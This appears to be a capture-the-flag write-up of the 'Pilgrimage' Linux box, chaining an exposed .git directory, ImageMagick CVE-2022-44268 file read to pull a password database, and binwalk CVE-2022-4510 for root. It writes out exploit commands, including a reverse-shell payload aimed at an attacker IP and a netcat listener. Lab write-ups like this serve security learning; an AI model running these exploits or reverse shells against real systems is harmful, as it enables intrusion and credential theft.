#Linux #git #CVE #ImageMagick #SQLite #binwalk #SSH #infodisclosure

## Overview

Pilgrimage is an easy Linux box with a satisfying two-CVE chain, both in tools you'd never suspect. An exposed `.git` directory leaks the source and a bundled **ImageMagick 7.1.0-49** binary vulnerable to **CVE-2022-44268** (arbitrary file read). I use it to read a SQLite database and recover a user's password. Root comes from **CVE-2022-4510**, a path-traversal RCE in **binwalk 2.3.2**, which a root cron job runs against every uploaded image.

## Recon

A directory scan exposed a `.git` folder. I dumped it and read the history:

```sh
python3 git_dumper.py http://pilgrimage.htb/ ~/pilgrim/
```

The repo revealed the app bundles a static `magick` binary and the `bulletproof` PHP upload library. The binary's version is the lead:

```
ImageMagick 7.1.0-49 beta
```

## Foothold

### CVE-2022-44268, ImageMagick Arbitrary File Read

> **How it works:** when ImageMagick processes a PNG with a `profile` chunk naming a local file path, it *embeds the contents of that file* into the output image's metadata. The app shrinks uploaded images with this exact version, so I upload a crafted PNG referencing a file, download the processed result, and read the file's bytes back out of the metadata.

The site stores data in SQLite (seen in the source: `sqlite:/var/db/pilgrimage`). I pointed the read at that database. It's binary, so instead of the script's text decode I extracted the embedded profile and reversed it from hex:

```sh
identify -verbose <processed>.png | grep -Pv "^( |Image)" | xxd -r -p
... CREATE TABLE users ... emily ‹redacted› ...
```

That gave `emily`'s password, which worked over SSH.

## Privilege Escalation

### CVE-2022-4510, binwalk RCE

`pspy`/process listing showed root running `malwarescan.sh`, which uses `inotifywait` to watch the upload directory and runs **binwalk** on every new file:

```sh
binout="$(/usr/local/bin/binwalk -e "$filename")"   # binwalk v2.3.2, as root
```

> **The bug:** binwalk extracts embedded filesystems using `os.path.join` to build output paths. A PFS-format entry can contain `../` in its filename, and because `os.path.join` doesn't resolve `../`, binwalk's "stay inside the output dir" check never trips. That's arbitrary file write as the binwalk process, and binwalk supports plugins that auto-execute during a scan, turning the write into RCE as root.

I built a reverse-shell PNG payload and dropped it into the watched directory:

```sh
python3 walkingpath.py reverse Untitled.png 10.10.14.126 53
# place it in /var/www/pilgrimage.htb/shrunk/ (wget on-box)
```

The instant the root cron picked it up, binwalk executed the embedded plugin:

```sh
rlwrap nc -lvnp 53
# whoami
root
```

## Root

Box rooted.

## Takeaways

- **Exposed `.git` = source + bundled binaries.** Dumping it revealed both the SQLite path and the vulnerable ImageMagick version.
- **CVE-2022-44268 turns image processing into file read**, extract the profile chunk and reverse it from hex.
- **CVE-2022-4510 makes binwalk RCE** via unresolved `../` in extracted filenames; dangerous because monitoring scripts run it as root on attacker-supplied files.
